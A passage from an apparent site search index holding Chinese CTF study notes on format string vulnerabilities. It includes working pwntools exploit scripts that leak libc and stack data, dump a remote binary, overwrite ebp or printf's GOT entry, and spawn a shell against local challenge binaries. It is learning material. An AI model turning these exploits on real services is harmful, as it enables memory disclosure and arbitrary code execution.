6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684 payload \u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002(\u8fd9\u91cc\u662f wiki \u7684\u4fee\u6539\u65b9\u6cd5\uff0c\u56e0\u4e3awiki exp \u6211\u672c\u5730\u6253\u4e0d\u901a\uff0c\u6362\u6210\u81ea\u5df1\u7684\uff0c\u6240\u4ee5\u4fee\u6539\u65b9\u6cd5\u4e5f\u4e0d\u4e00\u6837) part1 = (heap_addr - 4) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n' \u83b7\u53d6 shell \u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u5165 5 \uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6 shell\u3002 \u5229\u7528\u7a0b\u5e8f #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : contacts.py from pwn import * context.log_level = 'debug' p = process(\"./contacts\") elf = ELF(\"./contacts\") #libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\") # \u4f7f\u7528\u9898\u76ee\u63d0\u4f9b\u7684libc libc = ELF(\"./libc.so\") def creat(name,number,length,description): p.sendlineafter(\">>> \",'1') p.sendlineafter(\"Name: \",name) p.sendlineafter(\"No: \",number) p.sendlineafter(\"description: \",str(length)) p.sendlineafter(\"description:\\n\",description) def free(name): p.sendlineafter(\">>> \",'2') p.sendlineafter(\"remove? \",name) def edit(name,choose,newname='skye',length=10,description='skye'): p.sendlineafter(\">>> \",'3') p.sendlineafter(\"change? \",name) p.sendlineafter(\">>> \",str(choose)) if(choose==1): p.sendlineafter(\"name: \",newname) elif(choose==2): p.sendlineafter(\"description: \",str(length)) p.sendlineafter(\"Description: \\n\",description) def show(): p.sendlineafter(\">>> \",'4') # leak libc creat(\"skye\",\"skye\",24,'a'*4+\"%31$p\") show() p.recvuntil('a'*4) libc_start_main = int(p.recv(10),16) log.info(\"libc_start_main:\"+hex(libc_start_main)) libc_base = libc_start_main - 0x18637 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + libc.symbols['system'] log.info(\"system_addr:\"+hex(system_addr)) binsh_addr = libc_base + libc.search('sh\\x00').next() log.info(\"binsh_addr:\"+hex(binsh_addr)) # leak ebp&heap addr # \u5c06system\u524d\u7f6e\u53ef\u80fd\u4f1a\u9047\u5230\\x00\u963b\u65ad\uff0c\u53ef\u81ea\u884c\u540e\u7f6e\uff0c\u5e76\u8c03\u6574ebp\u8986\u76d6\u503c payload = p32(system_addr) + 'bbbb' + p32(binsh_addr) + '%6$p%11$pcccc' creat('2222', 'skye', 0x20, payload) show() p.recvuntil('Description: ') data = p.recvuntil('cccc', drop=True) data = data.split('0x') ebp_addr = int(data[-2], 16) log.info(\"ebp_addr:\"+hex(ebp_addr)) heap_addr = int(data[-1], 16) log.info(\"heap_addr:\"+hex(heap_addr)) # overwrite main_ebp payload = '%{}c%6$n'.format(str(heap_addr-4)) creat('3333', 'skye', 68, payload) #gdb.attach(p,'b *0x0804876A') #raw_input('pause') show() #getshell p.recvuntil('>>> ') p.sendline('5') p.interactive() \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230 shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u6253\u5370\u8fd9\u4e48\u591a\u5462\uff1f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e0d\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u5c31\u7b97\u6211\u4eec\u5f97\u5230\u4e86\u9700\u8981\u66f4\u6539\u7684 ebp \u7684\u5730\u5740\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u53bb\u628a\u8fd9\u4e2a\u5730\u5740\u5199\u5230\u6808\u4e0a\uff0c\u5229\u7528 $ \u7b26\u53f7\u53bb\u5b9a\u4f4d\u4ed6\uff1b\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u5b9a\u4f4d\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u7528 hn\\hhn \u7b49\u65b9\u5f0f\u53bb\u5199\u8fd9\u4e2a\u5730\u5740\uff0c\u53ea\u80fd\u7528 n \u65b9\u5f0f\u53bb\u5199\uff0c\u6240\u4ee5\u6253\u5370\u5f88\u591a\u3002 \u6ce8\u89e3 \uff1a \u6211\u7684\u811a\u672c\u4e2d\u7528\u7684\u4e0d\u662f system('/bin/sh') \uff0c\u800c\u662f system('sh') \uff0c\u8fd9\u662f\u56e0\u4e3a\u7528\u9898\u76ee\u63d0\u4f9b\u7684 libc \u641c\u7d22 /bin/sh \u5f97\u5230\u7ed3\u679c\u6709\u8bef\uff0c\u5f97\u5230\u7684\u5730\u5740\u4e0d\u662f /bin/sh \uff1a \u800c\u53bb\u5230 libcdatabase \u5f97\u5230\u7ed3\u679c\u662f\uff1a 0xf7f60a0b \uff0c\u91cc\u9762\u6709\u4e00\u4e2a 0x0a \u5c31\u662f\u6362\u884c\u7b26\u561b\uff0c\u8fd9\u6837\u4f1a\u63d0\u524d\u7ec8\u6b62\u8f93\u5165\uff0c\u6240\u4ee5\u4e5f\u4e0d\u884c\u3002\u6700\u540e\u4f7f\u7528\u9898\u76ee\u63d0\u4f9b libc \u641c\u7d22 sh \uff0c\u6210\u529f getshell \u3002 \u5728\u6211\u7684\u73af\u5883\uff08Ubuntu 16.04\uff09\u6ca1\u6709\u9047\u5230 system \\x00 \u963b\u65ad\uff0c\u6240\u4ee5 payload \u4e2d system \u524d\u7f6e\u3002\u5982\u679c\u9047\u5230\u963b\u65ad\uff0c\u5c31\u5c06 system \u540e\u7f6e\uff0c\u5e76\u8c03\u6574 ebp \u8986\u76d6\u5185\u5bb9\u52a0\u4e0a\u504f\u79fb\u5373\u53ef\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 ctf-wiki \u4e0a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4ecb\u7ecd\u4e0d\u662f\u5f88\u5168\u9762\uff0c\u6211\u67e5\u4e86\u5176\u4ed6\u5927\u4f6c\u7684\u7b14\u8bb0\uff0c\u81ea\u5df1\u603b\u7ed3\u4e86\uff1a Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u539f\u7406 \u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884c pwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002 \u4f8b\u5b50 1 - \u6cc4\u9732\u6808 \u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939 fmt_blind_stack \u4e2d\u3002 \u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570 \u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86 %p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f \u279c blind_fmt_stack git:(master) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% \u544a\u8bc9\u6211\u4eec flag \u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 \u5229\u7528 \u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b from pwn import * context.log_level = 'error' def leak(payload): sh = remote('127.0.0.1', 9999) sh.sendline(payload) data = sh.recvuntil('\\n', drop=True) if data.startswith('0x'): print p64(int(data, 16)) sh.close() i = 1 while 1: payload = '%{}$p'.format(i) leak(payload) i += 1 \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230 flag //////// //////// \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff flag{thi s_is_fla g}\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\xfe\\x7f\\x00\\x00 \u4f8b\u5b50 2 - \u76f2\u6253\u52ab\u6301 got \u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728 blind_fmt_got \u6587\u4ef6\u5939\u4e2d\u3002 \u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570 \u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a 64 \u4f4d\u3002 \u279c blind_fmt_got git:(master) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002 \u786e\u5b9a\u504f\u79fb \u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b \u279c blind_fmt_got git:(master) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a 6\u3002 \u6cc4\u9732 binary \u7531\u4e8e\u7a0b\u5e8f\u662f 64 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece 0x400000 \u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002 ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num += 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len(data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr += len(data) f.close() getbinary() \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 payload \u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709 '\\n' \u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002 \u5206\u6790 binary \u5229\u7528 IDA \u6253\u5f00\u6cc4\u9732\u7684 binary \uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8f main \u51fd\u6570\u7684\u5730\u5740 seg000:00000000004005F6 push rbp seg000:00000000004005F7 mov rbp, rsp seg000:00000000004005FA add rsp, 0FFFFFFFFFFFFFF80h seg000:00000000004005FE seg000:00000000004005FE loc_4005FE: ; CODE XREF: seg000:0000000000400639\u0019j seg000:00000000004005FE lea rax, [rbp-80h] seg000:0000000000400602 mov edx, 80h ; '\u20ac' seg000:0000000000400607 mov rsi, rax seg000:000000000040060A mov edi, 0 seg000:000000000040060F mov eax, 0 seg000:0000000000400614 call sub_4004C0 seg000:0000000000400619 lea rax, [rbp-80h] seg000:000000000040061D mov rdi, rax seg000:0000000000400620 mov eax, 0 seg000:0000000000400625 call sub_4004B0 seg000:000000000040062A mov rax, cs:601048h seg000:0000000000400631 mov rdi, rax seg000:0000000000400634 call near ptr unk_4004E0 seg000:0000000000400639 jmp short loc_4005FE \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662f sub_4004C0 \u4e3a read \u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662f read \u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684 sub_4004B0 \u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a while 1 \u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002 \u6ce8\u89e3\uff1a \u8865\u5145\u4e00\u5f20\u56fe \u5229\u7528\u601d\u8def \u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740\uff0c \u83b7\u53d6\u5bf9\u5e94 libc \u4ee5\u53ca system \u51fd\u6570\u5730\u5740 \u4fee\u6539 printf \u5730\u5740\u4e3a system \u51fd\u6570\u5730\u5740 \u8bfb\u5165 /bin/sh; \u4ee5\u4fbf\u4e8e\u83b7\u53d6 shell \u5229\u7528\u7a0b\u5e8f \u7a0b\u5e8f\u5982\u4e0b\u3002 ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context.arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num += 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len(data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr += len(data) f.close() ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote(ip, port) ## let the read get resolved sh.sendline('a') sh.recv() ## get printf addr payload = '%00008$s' + 'STARTEND' + p64(read_got) sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\\x00') sh.recv() read_addr = u64(data) ## get system addr libc = LibcSearcher('read', read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') log.success('system addr: ' + hex(system_addr)) log.success('read addr: ' + hex(read_addr)) ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() ## get shell sh.sendline('/bin/sh;') sh.interactive() \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801 ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() fmtstr_payload \u76f4\u63a5\u5f97\u5230\u7684 payload \u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4 printf \u7684\u65f6\u5019 '\\x00' \u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools \u76ee\u524d\u6b63\u5728\u5f00\u53d1 fmt_payload \u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u9762 8 \u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9 payload \u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f offset = (int)(math.ceil(len(payload) / 8.0) + 1) \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e '%order$hn' \u4e2d order \u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e 8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002 \u9898\u76ee SuCTF2018 - lock2 \uff08\u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2\uff09","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_1","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#64","text":"","title":"64 \u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"fmtstr/fmtstr_example/#_2","text":"\u5176\u5b9e 64 \u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c 32 \u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc7 64 \u4f4d\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f \u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_3","text":"","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_4","text":"\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2017 \u5e74\u7684 UIUCTF \u4e2d pwn200 GoodLuck \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2a flag.txt \u6587\u4ef6\u3002 \u279c 2017-UIUCTF-pwn200-GoodLuck git:(master) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86 Canary\u3001NX \u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206 RELRO \u4fdd\u62a4\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_5","text":"\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0; j <= 21; ++j ) { v5 = format[j]; if ( !v5 || v11[j] != v5 ) { puts(\"You answered:\"); printf(format); puts(\"\\nBut that was totally wrong lol get rekt\"); fflush(_bss_start); result = 0; goto LABEL_11; } } \u53ef\u4ee5\u770b\u5230 flag \u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a 5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a 4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d 6 \u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt \u5b57\u7b26\u4e32\u5b58\u50a8\u5728 RDI \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5 fmt \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a 10\u3002\u800c fmt \u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684 order \u4e3a fmt \u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230 flag \u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528 https://github.com/scwuaptx/Pwngdb \u4e2d\u7684 fmtarg \u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987b break \u5728 printf \u5904\u3002 \u6765\u81ea resery \u5e08\u5085\u6ce8\u89e3\uff1a \u8fd9\u91cc\u7684 10 \u662f\u7531 5+5 \u5f97\u5230\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e24\u4e2a 5 \u662f\u4ece\u54ea\u91cc\u7684\u5f97\u5230\u7684\uff0c\u6211\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u524d\u9762\u7684 5\uff1a\u7531\u4e8e 64 \u4e3a\u7a0b\u5e8f\uff0c\u524d 64 \u4e2a\u53c2\u6570\u662f\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff0c\u5206\u522b\u662f rdi\uff0crsi\uff0crcx\uff0crdx\uff0cr8\uff0cr9\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u50a8\u5728 rdi \u4e2d\u7684\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u504f\u79fb\u5c31\u5e94\u8be5\u662f 5+flag \u5728\u6808\u4e2d\u7684\u504f\u79fb\uff0c\u5728\u6808\u4e2d\u7684\u504f\u79fb\u5c31\u5f88\u597d\u7406\u89e3\u4e86\u5c31\u662f 5\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 10 \u6ce8\u89e3 \u6211\u5b89\u88c5\u7684 Pwndbg \u5e76\u6ca1\u6709 fmtarg \uff0c\u53ef\u80fd\u662f\u7248\u672c\u4e0d\u5bf9\uff0c\u5982\u679c\u9700\u8981\u5b89\u88c5\u4e00\u4e0b gef \u63d2\u4ef6\u3002 \u4e24\u4e2a\u4f5c\u8005\u90fd\u89e3\u91ca\u4e86\u504f\u79fb 10 \u662f\u600e\u4e48\u8ba1\u7b97\u6765\uff0c\u4f46\u6211\u66f4\u559c\u6b22\u7684\u65b9\u6cd5\u662f \u8f93\u5165\u4e00\u957f\u4e32 %p \u5f97\u51fa\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u76ee\u6807\u504f\u79fb\u6216\u5730\u5740 \u3002 shell $ ./goodluck what's the flag bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p You answered: bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161 But that was totally wrong lol get rekt 0x602830 \u662f\u7b2c 7 \u4f4d\u3002\u4e3a\u4ec0\u4e48\u6cc4\u9732\u7684\u4e0d\u662f 0x6262626262626262 